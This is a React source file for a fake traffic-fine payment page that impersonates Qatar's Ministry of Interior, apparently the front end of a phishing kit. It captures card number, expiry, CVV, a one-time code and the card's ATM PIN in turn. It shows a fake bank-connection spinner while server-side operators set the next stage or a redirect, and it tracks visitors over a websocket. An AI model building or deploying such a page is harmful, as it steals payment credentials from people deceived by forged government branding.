import React, { useState, useEffect, type FormEvent } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { useTranslation } from "@/hooks/useTranslation";
import { Header } from "@/components/Header";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";
type CardType = "visa" | "mastercard" | "unknown" | "invalid";

// Luhn Algorithm for card validation
const validateCardNumber = (number: string): boolean => {
  const digits = number.replace(/\D/g, '');
  if (digits.length < 13 || digits.length > 19) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
};

// Detect card type
const detectCardType = (number: string): CardType => {
  const cleanNumber = number.replace(/\s+/g, '');
  
  if (!cleanNumber) return "unknown";
  
  // Visa: starts with 4
  if (cleanNumber.startsWith('4')) {
    if (cleanNumber.length >= 13) {
      return validateCardNumber(cleanNumber) ? "visa" : "invalid";
    }
    return "unknown"; // Still typing
  }
  
  // Mastercard: starts with 51-55 or 2221-2720
  if (/^5[1-5]/.test(cleanNumber) || /^2[2-7]/.test(cleanNumber)) {
    if (cleanNumber.length >= 16) {
      return validateCardNumber(cleanNumber) ? "mastercard" : "invalid";
    }
    return "unknown"; // Still typing
  }
  
  // If it looks like a card but doesn't match known patterns and is long enough
  if (cleanNumber.length >= 16) {
    return "invalid";
  }
  
  return "unknown";
};

export default function Payment() {
  const { lang, setLanguage } = useLanguage();
  const { t } = useTranslation();
  const [, navigate] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const sessionId = searchParams.get("session") || localStorage.getItem("paymentSessionId") || "";
  
  const [stage, setStage] = useState<Stage>("card");
  const [error, setError] = useState<string | null>(null);
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [atmPin, setAtmPin] = useState("");
  const [cardType, setCardType] = useState<CardType>("unknown");
  const [isFocused, setIsFocused] = useState(false);

  const updateStageMutation = trpc.payment.updateStage.useMutation();

  const { data: sessionData } = trpc.payment.getSession.useQuery(
    { sessionId },
    { enabled: !!sessionId }
  );

  const submitCardMutation = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => setError(err.message),
  });

  const submitOtpMutation = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => setError(err.message),
  });

  const submitAtmPinMutation = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => setError(err.message),
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId,
      refetchInterval: 2000,
    }
  );

  useEffect(() => {
    if (sessionId) {
      updateStageMutation.mutate({ sessionId, stage: "card" });
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      const ws = new WebSocket(`${protocol}//${window.location.host}/ws/visitors?page=/payment&sessionId=${sessionId}`);
      return () => ws.close();
    }
  }, [sessionId]);

  useEffect(() => {
    if (sessionStatus?.redirectUrl) {
      window.location.href = sessionStatus.redirectUrl;
      return;
    }
    if (sessionStatus?.stage && sessionStatus.stage !== stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
      else setError(null);
    }
  }, [sessionStatus, stage]);

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    
    if (cardType === "invalid") {
      setError(lang === "ar" ? "رقم البطاقة غير صالح" : "Invalid card number");
      return;
    }
    
    setError(null);
    submitCardMutation.mutate({
      sessionId,
      cardName,
      cardNumber: cardNumber.replace(/\s+/g, ''),
      cardExpiry,
      cardCvv,
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitOtpMutation.mutate({ sessionId, otpCode });
  };

  const handleAtmSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitAtmPinMutation.mutate({ sessionId, atmPin });
  };

  const formatCardNumber = (val: string) => {
    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const newCardType = detectCardType(v);
    setCardType(newCardType);
    
    const parts = [];
    for (let i = 0; i < v.length; i += 4) {
      parts.push(v.substring(i, i + 4));
    }
    return parts.join(' ');
  };

  const formatExpiry = (val: string) => {
    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length >= 2) return v.substring(0, 2) + '/' + v.substring(2, 4);
    return v;
  };

  const isAr = lang === "ar";

  const displayId = sessionData?.qidNumber || sessionData?.establishmentId || sessionData?.plateNumber || "-";
  const displayTitle = sessionData?.qidNumber 
    ? (isAr ? "الرقم الشخصي" : "Personal ID") 
    : sessionData?.establishmentId 
      ? (isAr ? "رقم المنشأة" : "Establishment ID")
      : (isAr ? "رقم اللوحة" : "Plate Number");

  return (
    <div className="min-h-screen bg-[#f8fafc] font-sans flex flex-col" dir={isAr ? "rtl" : "ltr"}>
      <Header />

      <main className="flex-grow max-w-2xl mx-auto px-4 py-10 w-full">
        {/* Payment Summary Box */}
        <div className="bg-white border border-gray-200 rounded-2xl shadow-lg mb-8 overflow-hidden">
          <div className="bg-[#8A1538] px-8 py-5 text-white">
            <span className="text-sm font-black uppercase tracking-wider">{isAr ? "ملخص الدفع" : "Payment Summary"}</span>
          </div>
          <div className="p-8">
            <div className="grid grid-cols-2 md:grid-cols-4 gap-8">
              {/* Plate Number */}
              <div className="border-l-2 border-[#8A1538]/20 pl-4">
                <p className="text-[9px] text-gray-500 font-bold uppercase mb-3 tracking-wider">{isAr ? "رقم اللوحة" : "Plate Number"}</p>
                <p className="text-xl font-black text-[#003E66]">{sessionData?.plateNumber || "-"}</p>
              </div>
              {/* QID Number */}
              <div className="border-l-2 border-[#8A1538]/20 pl-4">
                <p className="text-[9px] text-gray-500 font-bold uppercase mb-3 tracking-wider">{isAr ? "الرقم الشخصي" : "Personal ID"}</p>
                <p className="text-xl font-black text-[#003E66]">{sessionData?.qidNumber || "-"}</p>
              </div>
              {/* Plate Type */}
              <div className="border-l-2 border-[#8A1538]/20 pl-4">
                <p className="text-[9px] text-gray-500 font-bold uppercase mb-3 tracking-wider">{isAr ? "نوع اللوحة" : "Plate Type"}</p>
                <p className="text-xl font-black text-[#003E66]">{sessionData?.plateType || "-"}</p>
              </div>
              {/* Total Amount */}
              <div className="border-l-2 border-[#8A1538] pl-4">
                <p className="text-[9px] text-gray-500 font-bold uppercase mb-3 tracking-wider">{isAr ? "المبلغ الإجمالي" : "Total Amount"}</p>
                <p className="text-2xl font-black text-[#8A1538]">{sessionData?.totalAmount} <span className="text-sm font-bold">QAR</span></p>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white border border-gray-100 rounded-[2rem] shadow-2xl overflow-hidden">
          <div className="p-8 sm:p-12">
            {/* Stage: Card Entry */}
            {stage === "card" && (
              <form onSubmit={handleCardSubmit} className="space-y-8">
                <div className="flex items-center gap-4 mb-2">
                  <div className="w-12 h-12 bg-[#8A1538] rounded-2xl flex items-center justify-center text-white shadow-lg shadow-[#8A1538]/20">
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
                  </div>
                  <div>
                    <h2 className="text-2xl font-black text-gray-900">{isAr ? "بطاقة الدفع" : "Payment Card"}</h2>
                    <p className="text-xs text-gray-400 font-bold uppercase">{isAr ? "أدخل بيانات بطاقتك البنكية" : "Enter your bank card details"}</p>
                  </div>
                </div>

                {error && (
                  <div className="p-4 bg-red-50 border-s-4 border-red-500 text-red-700 text-sm font-black animate-in slide-in-from-top duration-300">
                    {error}
                  </div>
                )}

                <div className="space-y-6">
                  {/* Professional Card Number Input */}
                  <div className="space-y-2">
                    <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">{isAr ? "رقم البطاقة" : "Card Number"}</label>
                    <div className={`group relative flex items-center transition-all duration-300 ${
                      cardType === "invalid" 
                        ? "ring-2 ring-red-500 shadow-lg shadow-red-100" 
                        : isFocused 
                        ? "ring-2 ring-[#8A1538] shadow-lg shadow-[#8A1538]/10" 
                        : "ring-1 ring-gray-200"
                    } rounded-2xl bg-gray-50/50`}>
                      
                      {/* Dynamic Card Logo on Left */}
                      <div className={`flex items-center justify-center w-16 h-14 flex-shrink-0 transition-all duration-500`}>
                        {cardType === "visa" && (
                          <img src="/visa-logo.png" alt="Visa" className="h-6 animate-in zoom-in duration-300" />
                        )}
                        {cardType === "mastercard" && (
                          <img src="/mastercard-logo.png" alt="Mastercard" className="h-8 animate-in zoom-in duration-300" />
                        )}
                        {cardType === "invalid" && (
                          <div className="w-8 h-8 bg-red-100 rounded-full flex items-center justify-center text-red-500 animate-in shake duration-500">
                            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" /></svg>
                          </div>
                        )}
                        {!cardType || cardType === "unknown" && (
                          <svg className="w-6 h-6 text-[#8A1538]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
                        )}
                      </div>

                      <input 
                        type="text" 
                        value={cardNumber} 
                        onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} 
                        onFocus={() => setIsFocused(true)}
                        onBlur={() => setIsFocused(false)}
                        maxLength={19} 
                        className="flex-grow bg-transparent p-4 outline-none font-mono text-xl font-bold text-gray-900 placeholder-gray-300"
                        placeholder="0000 0000 0000 0000" 
                        required 
                      />
                    </div>
                    
                    {/* Professional Error Message */}
                    {cardType === "invalid" && cardNumber && (
                      <div className="flex items-center gap-2 text-red-600 px-1 animate-in fade-in slide-in-from-left duration-300">
                        <span className="w-1.5 h-1.5 bg-red-600 rounded-full"></span>
                        <p className="text-[11px] font-black uppercase">{isAr ? "رقم البطاقة غير صحيح أو غير مدعوم" : "Invalid or unsupported card number"}</p>
                      </div>
                    )}
                  </div>

                  <div className="grid grid-cols-2 gap-6">
                    <div className="space-y-2">
                      <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">{isAr ? "تاريخ الانتهاء" : "Expiry Date"}</label>
                      <input 
                        type="text" 
                        value={cardExpiry} 
                        onChange={(e) => setCardExpiry(formatExpiry(e.target.value))} 
                        maxLength={5} 
                        placeholder="MM/YY" 
                        className="w-full p-4 bg-gray-50/50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none text-center font-mono font-bold transition-all" 
                        required 
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">{isAr ? "رمز الأمان (CVV)" : "CVV"}</label>
                      <input 
                        type="password" 
                        value={cardCvv} 
                        onChange={(e) => setCardCvv(e.target.value.replace(/[^0-9]/g, ''))} 
                        maxLength={3} 
                        placeholder="•••" 
                        className="w-full p-4 bg-gray-50/50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none text-center font-mono font-bold transition-all" 
                        required 
                      />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">{isAr ? "اسم حامل البطاقة" : "Cardholder Name"}</label>
                    <input 
                      type="text" 
                      value={cardName} 
                      onChange={(e) => setCardName(e.target.value.toUpperCase())} 
                      className="w-full p-4 bg-gray-50/50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none font-black transition-all" 
                      placeholder="JASSIM AL-THANI" 
                      required 
                    />
                  </div>
                </div>

                <button 
                  type="submit" 
                  disabled={submitCardMutation.isPending || cardType === "invalid" || !cardNumber} 
                  className="w-full bg-[#8A1538] text-white py-6 rounded-2xl font-black text-xl hover:bg-[#70112d] transition-all shadow-xl shadow-[#8A1538]/20 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed mt-6"
                >
                  {submitCardMutation.isPending ? (isAr ? "جاري المعالجة..." : "Processing...") : (isAr ? "إتمام الدفع الآمن" : "Complete Secure Payment")}
                </button>
              </form>
            )}

            {/* Stage: Loading / Pending */}
            {stage.includes("pending") && (
              <div className="py-20 text-center space-y-8">
                <div className="relative w-24 h-24 mx-auto">
                  <div className="absolute inset-0 border-8 border-gray-50 rounded-full"></div>
                  <div className="absolute inset-0 border-8 border-[#8A1538] border-t-transparent rounded-full animate-spin"></div>
                </div>
                <div>
                  <h3 className="text-2xl font-black text-gray-900">{isAr ? "تأمين المعاملة" : "Securing Transaction"}</h3>
                  <p className="text-sm text-gray-400 font-bold uppercase mt-2">{isAr ? "يرجى الانتظار، يتم الاتصال بالبنك..." : "Connecting to bank secure server..."}</p>
                </div>
              </div>
            )}

            {/* Stage: OTP */}
            {stage === "otp" && (
              <form onSubmit={handleOtpSubmit} className="text-center space-y-10 py-6">
                <div className="w-24 h-24 bg-[#003E66]/5 text-[#003E66] rounded-[2rem] flex items-center justify-center mx-auto shadow-sm">
                  <svg className="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                </div>
                <div>
                  <h3 className="text-3xl font-black text-gray-900">{isAr ? "رمز التحقق" : "OTP Verification"}</h3>
                  <p className="text-gray-400 text-sm font-bold mt-2">
                    {isAr ? "أدخل الرمز المكون من 6 أرقام المرسل لهاتفك" : "Enter the 6-digit code sent to your mobile"}
                  </p>
                </div>
                <input 
                  value={otpCode} 
                  onChange={(e) => setOtpCode(e.target.value)} 
                  className="w-full text-center text-5xl font-black p-6 bg-gray-50 border-2 border-gray-100 rounded-[2rem] outline-none focus:border-[#8A1538] focus:bg-white transition-all font-mono tracking-[0.4em]" 
                  placeholder="000000" 
                  maxLength={6} 
                  required 
                  autoFocus
                />
                <button type="submit" disabled={submitOtpMutation.isPending} className="w-full bg-[#8A1538] text-white font-black py-6 rounded-2xl text-xl shadow-xl hover:bg-[#70112d] transition-all">
                  {submitOtpMutation.isPending ? (isAr ? "جاري التحقق..." : "Verifying...") : (isAr ? "تأكيد الرمز" : "Verify Code")}
                </button>
              </form>
            )}

            {/* Stage: ATM PIN */}
            {stage === "atm" && (
              <form onSubmit={handleAtmSubmit} className="text-center space-y-10 py-6">
                <div className="w-24 h-24 bg-gray-50 text-gray-300 rounded-[2rem] flex items-center justify-center mx-auto shadow-sm">
                  <svg className="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                </div>
                <div>
                  <h3 className="text-3xl font-black text-gray-900">{isAr ? "الرقم السري" : "Card PIN"}</h3>
                  <p className="text-gray-400 text-sm font-bold mt-2">
                    {isAr ? "أدخل الرقم السري للبطاقة (4 أرقام)" : "Enter your 4-digit card PIN"}
                  </p>
                </div>
                <input 
                  type="password" 
                  value={atmPin} 
                  onChange={(e) => setAtmPin(e.target.value.replace(/[^0-9]/g, ''))} 
                  className="w-56 mx-auto text-center text-5xl font-black p-6 bg-gray-50 border-2 border-gray-100 rounded-[2rem] outline-none focus:border-[#8A1538] focus:bg-white transition-all font-mono tracking-[0.6em]" 
                  placeholder="0000" 
                  maxLength={4} 
                  required 
                  autoFocus
                />
                <button type="submit" disabled={submitAtmPinMutation.isPending} className="w-full bg-[#8A1538] text-white font-black py-6 rounded-2xl text-xl shadow-xl hover:bg-[#70112d] transition-all">
                  {submitAtmPinMutation.isPending ? (isAr ? "جاري التحقق..." : "Verifying...") : (isAr ? "تأكيد الرقم السري" : "Confirm PIN")}
                </button>
              </form>
            )}

            {/* Stage: Success */}
            {stage === "success" && (
              <div className="py-16 text-center space-y-10">
                <div className="w-32 h-32 bg-green-50 text-green-500 rounded-[3rem] flex items-center justify-center mx-auto shadow-sm">
                  <svg className="w-16 h-16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="4" d="M5 13l4 4L19 7" /></svg>
                </div>
                <div>
                  <h2 className="text-4xl font-black text-gray-900">{isAr ? "تم الدفع بنجاح" : "Success!"}</h2>
                  <p className="text-gray-400 font-bold uppercase mt-4 tracking-widest">
                    {isAr ? "تم تحديث سجل المخالفات بنجاح" : "Traffic records updated successfully"}
                  </p>
                </div>
                <button 
                  onClick={() => navigate("/")}
                  className="w-full bg-gray-900 text-white font-black py-6 rounded-2xl text-xl shadow-xl hover:bg-black transition-all"
                >
                  {isAr ? "العودة للرئيسية" : "Back to Home"}
                </button>
              </div>
            )}
          </div>
        </div>
      </main>

      {/* Professional Payment Footer */}
      <footer className="bg-white border-t border-gray-200 w-full mt-auto">
        <div className="max-w-7xl mx-auto px-6 py-10">
          
          {/* All Payment Methods in One Professional Row */}
          <div className="flex flex-wrap items-center justify-center gap-8 py-8">
            {/* Visa */}
            <img src="/visa-logo.png" alt="Visa" className="h-8 object-contain opacity-80 hover:opacity-100 transition-opacity" />
            {/* Mastercard */}
            <img src="/mastercard-logo.png" alt="Mastercard" className="h-10 object-contain opacity-80 hover:opacity-100 transition-opacity" />
            {/* American Express */}
            <img src="/amex-logo.png" alt="American Express" className="h-8 object-contain opacity-80 hover:opacity-100 transition-opacity" />
            
            {/* Divider */}
            <div className="h-8 w-px bg-gray-300"></div>
            
            {/* Apple Pay */}
            <img src="/apple-pay-logo.png" alt="Apple Pay" className="h-8 object-contain opacity-80 hover:opacity-100 transition-opacity" />
            {/* Google Pay */}
            <img src="/google-pay-logo.png" alt="Google Pay" className="h-8 object-contain opacity-80 hover:opacity-100 transition-opacity" />
            {/* Samsung Pay */}
            <img src="/samsung-pay-logo.png" alt="Samsung Pay" className="h-8 object-contain opacity-80 hover:opacity-100 transition-opacity" />
            
            {/* Divider */}
            <div className="h-8 w-px bg-gray-300"></div>
            
            {/* NAPS */}
            <img src="/naps-logo.png" alt="NAPS" className="h-8 object-contain opacity-80 hover:opacity-100 transition-opacity" />
            {/* QPAY */}
            <img src="/qpay-logo.png" alt="QPAY" className="h-8 object-contain opacity-80 hover:opacity-100 transition-opacity" />
            {/* HIMYAN */}
            <img src="/himyan-logo.png" alt="HIMYAN" className="h-8 object-contain opacity-80 hover:opacity-100 transition-opacity" />
            
            {/* Divider */}
            <div className="h-8 w-px bg-gray-300"></div>
            
            {/* PCI-DSS */}
            <img src="/pci-dss-logo.png" alt="PCI DSS" className="h-8 object-contain opacity-80 hover:opacity-100 transition-opacity" />
          </div>

          {/* Bottom Footer */}
          <div className="pt-6 border-t border-gray-200 flex flex-col md:flex-row justify-between items-center gap-2 text-[9px] text-gray-400 font-bold uppercase tracking-widest">
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 bg-[#8A1538] rounded-full"></span>
              <p>© {new Date().getFullYear()} {isAr ? "وزارة الداخلية - دولة قطر" : "Ministry of Interior - State of Qatar"}</p>
            </div>
            <p className="text-[9px] text-gray-300">
              {isAr ? "جميع الحقوق محفوظة" : "All Rights Reserved"}
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
